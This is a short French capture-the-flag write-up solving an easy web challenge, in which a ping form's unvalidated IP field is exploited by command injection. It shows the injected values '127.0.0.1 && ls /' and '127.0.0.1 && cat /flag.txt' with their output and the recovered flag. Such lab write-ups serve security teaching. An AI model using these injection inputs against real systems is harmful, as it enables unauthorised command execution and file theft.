# Web : Bienvenue sur mon premier site 4/4
**Challenge Author(s)**: SevenInside
**Difficulty**: Facile

## Synopsis

Le créateur du site nous indique que de nombreux flags sont à trouver !

## Steps to solve

Pour ce dernier flag, le site nous permet de voir la configuration IP ainsi que d'executer une commande `ping` qui prend en paramètre une adresse IP. Or il semble n'y avoir aucune vérification sur les entrées utilisateurs. Ainsi si on remplace l'adresse IP par `127.0.0.1 && ls /`, on obtient :

```bash
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.029 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.055 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.057 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.057 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3052ms
rtt min/avg/max/mdev = 0.029/0.049/0.057/0.011 ms
bin
bin.usr-is-merged
boot
dev
etc
flag.txt
home
lib
lib.usr-is-merged
lib64
...
```

On peut donc ouvrir de la même manière le fichier flag.txt (`127.0.0.1 && cat /flag.txt`), on obtient le résutalt suivant : `hit{bien-joue-le-site-est-dans-vos-mains}`



